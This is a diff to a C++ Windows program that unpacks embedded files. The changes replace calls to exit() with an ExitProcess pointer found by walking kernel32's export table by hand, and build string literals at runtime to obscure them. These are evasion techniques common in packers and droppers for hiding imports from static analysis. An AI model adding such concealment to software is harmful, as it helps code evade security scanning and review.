@@ -140,6 +140,8 @@ typedef BOOL (WINAPI *VVIA)(LPOSVERSIONINFOEXA,DWORD,DWORDLONG);
 VVIA vvia;
 typedef FARPROC (WINAPI *GPA)(HMODULE,LPCSTR);
 GPA gpa;
+typedef VOID (WINAPI *EXP)(UINT);
+EXP exp;
 
 typedef int (__cdecl *_access_t)(const char *,int);
 _access_t _access_p;
@@ -165,12 +167,12 @@ calloc_t calloc_p;
 template <typename T> void get_fn_ptr(T* &p,HINSTANCE l,const char *f){
   if(l){
     p=(T*)gpa(l,f);
-    if(!p) exit(1);
+    if(!p) exp(1);
     char *c=(char *)f;
     while(*c) *c++=0;
     return;
   };
-  exit(1);
+  exp(1);
 };
 
 HBITMAP hBitmap,hOldBitmap;
@@ -314,7 +316,7 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
 int dlg_window(HINSTANCE hInstance){
   hI=hInstance;
   WNDCLASS wc;
-  wc.style=CS_DROPSHADOW;
+  wc.style=0;
   wc.lpfnWndProc=dlg_wndproc;
   wc.hInstance=hInstance;
   wc.hIcon=lia(NULL,IDI_APPLICATION);
@@ -385,7 +387,8 @@ void null_window(HINSTANCE hInstance){
   wc.hIcon=wc.hCursor=NULL;
   wc.hbrBackground=NULL;
   wc.lpszMenuName=NULL;
-  wc.lpszClassName="main";
+  _s(clsn,"main",4);
+  wc.lpszClassName=clsn;
   null_msg=RegisterWindowMessageA(wc.lpszClassName);
   if(!RegisterClass(&wc)) return;
   hwnd=CreateWindow(wc.lpszClassName,NULL,0,0,0,0,0,0,0,hInstance,0);
@@ -587,7 +590,8 @@ void unarc(char *out){
     if(read_packed_value(t,sizeof(uint32_t))) break;
     if(dptr==dsize) break;
     rmkdir(fp,0);
-    fopen_s_p(&o,fp,"wb");
+    _s(wb,"wb",2);
+    fopen_s_p(&o,fp,wb);
     if(o){
       for(i=0;i<fl;i++){
         if(unpack_file()) return;
@@ -646,6 +650,20 @@ void gpa_kernel(){
     if(*src==0 && *dst==0) gpa=(GPA)(moduleBase+eatFunctions[eatOrdinals[i]]);
   };
   char *c=(char *)kern_gpa;
+  while(*c) *c++=0;
+  _s(expn,"ExitProcess",11);
+  for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
+    eatNameOffset=eatNames[i];
+    char *src=(char*)(moduleBase+eatNameOffset);
+    char *dst=(char*)expn;
+    while(*src && *dst){
+      if(*src!=*dst) break;
+      src++;
+      dst++;
+    };
+    if(*src==0 && *dst==0) exp=(EXP)(moduleBase+eatFunctions[eatOrdinals[i]]);
+  };
+  c=(char *)expn;
   while(*c) *c++=0;
 };
 
@@ -759,7 +777,7 @@ void init(){
   get_fn_ptr(lto,hgdi32,f0020);
   get_fn_ptr(mte,hgdi32,f0021);
   get_fn_ptr(sea,hshell32,f0015);
-  if (!iswin10()) exit(0);
+  if (!iswin10()) exp(0);
 };
 
 INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine,INT nCmdShow){
